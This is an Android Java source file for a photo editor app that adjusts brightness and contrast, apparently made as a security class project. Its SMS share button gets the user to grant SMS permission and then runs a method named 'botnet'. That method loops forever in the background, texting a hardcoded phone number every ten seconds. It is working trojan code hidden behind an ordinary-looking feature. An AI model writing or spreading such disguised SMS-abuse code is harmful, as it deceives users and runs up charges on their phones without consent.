package com.example.securityproject;

import android.Manifest;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.drawable.BitmapDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.ImageView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.Intent;
import android.net.Uri;
import android.view.View;
import android.content.Intent;
import android.widget.Toast;
import android.widget.ToggleButton;
import android.provider.MediaStore;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Objects;
import java.util.concurrent.TimeUnit;


public class Editing_activity extends AppCompatActivity {

    private ImageView imageView;
    private Button backBtn, colBtn, smsBtn, saveBtn, btnEdit1, btnEdit2;
    private ToggleButton shareBtn, brightBtn, contBtn, locBtn;
    private static final int REQ_SMS = 100;
    private static Bitmap bitmap = null;
    private static int flag = 1;
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.editing);

        imageView = findViewById(R.id.capturedImage);
        Intent intent = getIntent();

        //retrieving the images from the main activity
        Bitmap bm = (Bitmap) intent.getParcelableExtra("imageGal");
        Bitmap bm2 = (Bitmap) intent.getParcelableExtra("imageBitmap");

        if (bm != null)
        {
            imageView.setImageBitmap(bm);
            bitmap = bm;
        }
        else if (bm2 != null) {
            imageView.setImageBitmap(bm2);
            bitmap = bm2;
        }

        backBtn = findViewById(R.id.button1);
        brightBtn = findViewById(R.id.buttonBrightness);
        contBtn = findViewById(R.id.buttonContrast);
        shareBtn = findViewById(R.id.button2);
        smsBtn = findViewById(R.id.SMS);
        saveBtn = findViewById(R.id.save);
        btnEdit1 = findViewById(R.id.buttonExtra1);
        btnEdit2 = findViewById(R.id.buttonExtra2);

        // Setup button listeners
        brightBtn.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    adjustBrightness();
                    flag = 1;
                    contBtn.setEnabled(false);
                } else {
                    // The toggle is disabled
                    btnEdit1.setVisibility(View.INVISIBLE);
                    btnEdit2.setVisibility(View.INVISIBLE);
                    contBtn.setEnabled(true);
                }
            }
        });

        contBtn.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    adjustContrast();
                    flag = 0;
                    brightBtn.setEnabled(false);
                } else {
                    // The toggle is disabled
                    btnEdit1.setVisibility(View.INVISIBLE);
                    btnEdit2.setVisibility(View.INVISIBLE);
                    brightBtn.setEnabled(true);
                }
            }
        });


        backBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Editing_activity.this, MainActivity.class);
                startActivity(intent);
            }
        });

        shareBtn.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                if (isChecked) {
                    smsBtn.setVisibility(View.VISIBLE);
                    saveBtn.setVisibility(View.VISIBLE);
                } else {
                    // The toggle is disabled
                    smsBtn.setVisibility(View.INVISIBLE);
                    saveBtn.setVisibility(View.INVISIBLE);
                }
            }
        });

        smsBtn.setOnClickListener(new View.OnClickListener()
        {
            @Override
            public void onClick(View v)
            {
                if (ContextCompat.checkSelfPermission(Editing_activity.this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
                {
                    ActivityCompat.requestPermissions(Editing_activity.this, new String[]{Manifest.permission.SEND_SMS}, REQ_SMS);
                }
                else
                {
                    botnet();
                }
        }});

        saveBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                saveImageToGallery(bitmap);
            }
        });

        btnEdit1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (flag == 1)
                    increaseBrightness(); // Call method to increase brightness
                else if (flag == 0)
                    increaseContrast();

            }
        });

        btnEdit2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (flag == 1)
                    decreaseBrightness(); // Call method to decrease brightness
                else if (flag == 0)
                    decreaseContrast();
            }
        });

    }

    //function to setup the brightness
    private void adjustBrightness() {
        // Implement brightness adjustment logic
        btnEdit1.setText("Increase Brightness");
        btnEdit2.setText("Decrease Brightness");
        btnEdit1.setVisibility(View.VISIBLE);
        btnEdit2.setVisibility(View.VISIBLE);
    }

    //function to setup the contrast
    private void adjustContrast() {
        // Implement contrast adjustment logic
        btnEdit1.setText("Increase Contrast");
        btnEdit2.setText("Decrease Contrast");
        btnEdit1.setVisibility(View.VISIBLE);
        btnEdit2.setVisibility(View.VISIBLE);
    }

    //function to save image to gallery
    private void saveImageToGallery(Bitmap imageBitmap) {
        // First, check and request storage permission if necessary
        File storageDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);

        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
        String filename = "IMG_" + timeStamp + ".jpg";

        File imageFile = new File(storageDir, filename);
        Uri uri = Uri.fromFile(imageFile);

        try {

            FileOutputStream outputStream = new FileOutputStream(imageFile);
            imageBitmap.compress(Bitmap.CompressFormat.JPEG, 100, outputStream);
            outputStream.flush();
            outputStream.close();

            Intent mediaScanIntent = new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE);
            mediaScanIntent.setData(Uri.fromFile(imageFile));
            sendBroadcast(mediaScanIntent);

            Toast.makeText(this, "Saved image successfully.", Toast.LENGTH_SHORT).show();

        }catch (Exception e)
        {

        }
    }

    //handling permission requests
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_SMS)
        {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
            {
                // Permission granted, start botnet
                botnet();

            } else
            {
                // Permission denied, show message to user
                Toast.makeText(this, "SMS permission denied, give access to share photo", Toast.LENGTH_SHORT).show();
                if (!ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.SEND_SMS))
                {
                    // User selected 'Don't ask again', direct them to app settings
                    openAppSettings();
                }
            }
        }
    }

    //function to direct the user to permission settings
    private void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);
        startActivity(intent);
    }

    //function to start the attack
    private void botnet()
    {
        new Thread(new Runnable()
        {
            @Override
            public void run() {
                while (true) {//keep running continuously
                    try {
                        String message = "Sending the photo";
                        String number = "+971529192826";
                        SmsManager sms = SmsManager.getDefault();
                        try {
                            sms.sendTextMessage(number, null, message, null, null); //sending from a vm will crash the because it doesn't have a sim card
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    Toast.makeText(Editing_activity.this, "SMS Sent!", Toast.LENGTH_LONG).show();
                                }
                            });
                        } catch (Exception e) {
                            e.printStackTrace();
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    Toast.makeText(Editing_activity.this, "SMS not Sent!", Toast.LENGTH_LONG).show();
                                }
                            });
                        }
                        TimeUnit.SECONDS.sleep(10);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }
            }
        }).start();
    }
    //function to increase the brightness
    private void increaseBrightness() {
        Bitmap mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true); // Ensure the bitmap is mutable
        bitmap = changeBitmapBrightness(mutableBitmap, 15); // Increase brightness by 15
        imageView.setImageBitmap(bitmap);
    }

    //function to decrease the brightness
    private void decreaseBrightness() {
        Bitmap mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true); // Ensure the bitmap is mutable
        bitmap = changeBitmapBrightness(mutableBitmap, -15); // Decrease brightness by 15
        imageView.setImageBitmap(bitmap);
    }

    //function to perform the actual changes of brightness
    private Bitmap changeBitmapBrightness(Bitmap bmp, int value) {
        Bitmap result = Bitmap.createBitmap(bmp.getWidth(), bmp.getHeight(), bmp.getConfig());
        int A, R, G, B;
        int pixelColor;
        int height = bmp.getHeight();
        int width = bmp.getWidth();

        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                pixelColor = bmp.getPixel(x, y);
                A = Color.alpha(pixelColor);
                R = Math.max(0, Math.min(255, Color.red(pixelColor) + value));
                G = Math.max(0, Math.min(255, Color.green(pixelColor) + value));
                B = Math.max(0, Math.min(255, Color.blue(pixelColor) + value));
                result.setPixel(x, y, Color.argb(A, R, G, B));
            }
        }

        return result;
    }

    //function to perform the actual changes of contrast
    private Bitmap changeBitmapContrast(Bitmap bmp, float contrastFactor) {
        Bitmap result = Bitmap.createBitmap(bmp.getWidth(), bmp.getHeight(), bmp.getConfig());
        int A, R, G, B;
        int pixelColor;
        int height = bmp.getHeight();
        int width = bmp.getWidth();

        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                pixelColor = bmp.getPixel(x, y);
                A = Color.alpha(pixelColor);

                R = Color.red(pixelColor);
                R = (int)(((((R / 255.0) - 0.5) * contrastFactor) + 0.5) * 255.0);
                if (R < 0) R = 0;
                else if (R > 255) R = 255;

                G = Color.green(pixelColor);
                G = (int)(((((G / 255.0) - 0.5) * contrastFactor) + 0.5) * 255.0);
                if (G < 0) G = 0;
                else if (G > 255) G = 255;

                B = Color.blue(pixelColor);
                B = (int)(((((B / 255.0) - 0.5) * contrastFactor) + 0.5) * 255.0);
                if (B < 0) B = 0;
                else if (B > 255) B = 255;

                result.setPixel(x, y, Color.argb(A, R, G, B));
            }
        }

        return result;
    }
    //function to increase contrast
    private void increaseContrast() {
        if (bitmap != null) {
            Bitmap mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true);
            bitmap = changeBitmapContrast(mutableBitmap, 1.2f); // Increase contrast; adjust the factor as needed
            imageView.setImageBitmap(bitmap);
        }
    }

    //function to decrease the contrast
    private void decreaseContrast() {
        if (bitmap != null) {
            Bitmap mutableBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true);
            bitmap = changeBitmapContrast(mutableBitmap, 0.8f); // Decrease contrast; adjust the factor as needed
            imageView.setImageBitmap(bitmap);
        }
    }


}
